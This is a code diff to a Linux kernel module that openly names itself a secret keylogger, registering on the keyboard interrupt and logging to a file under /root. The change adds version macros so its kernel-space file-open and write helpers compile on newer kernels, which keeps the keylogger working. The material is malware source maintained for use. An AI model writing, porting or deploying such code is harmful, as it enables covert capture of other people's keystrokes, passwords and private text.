@@ -40,8 +40,21 @@
 #include <asm/uaccess.h>
 #include <linux/buffer_head.h>
 #include <linux/string.h>
+#include <linux/version.h>
 
 #define KB_IRQ 1
+
+#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 14, 0)
+#define VFS_WRITE kernel_write
+#else
+#define VFS_WRITE vfs_write
+#endif
+
+#if LINUX_VERSION_CODE > KERNEL_VERSION(5, 1, 0)
+#define GET_DS KERNEL_DS
+#else
+#define GET_DS get_ds()
+#endif
 
 const char *NAME = "---Secret_Keylogger---";
 const char *LOG_FILE = "/root/log";
@@ -68,7 +81,7 @@ struct file* log_open(const char *path, int flags, int rights)
 	/* Set current process address limit to that of the kernel, allowing
  	 * the system call to access kernel memory.
 	 */ 
-	set_fs(get_ds());
+	set_fs(GET_DS);
 	fp = filp_open(path, flags, rights);
 	/* Restore address limit to current process. */
 	set_fs(old_fs);
@@ -97,9 +110,9 @@ int log_write(struct file *fp, unsigned char *data,
 	int ret;
 
 	old_fs = get_fs();
-	set_fs(get_ds());
+	set_fs(GET_DS);
 
-	ret = vfs_write(fp, data, size, &log_offset);
+	ret = VFS_WRITE(fp, data, size, &log_offset);
 	/* Increase file offset, preparing for next write operation. */
 	log_offset += size;
 
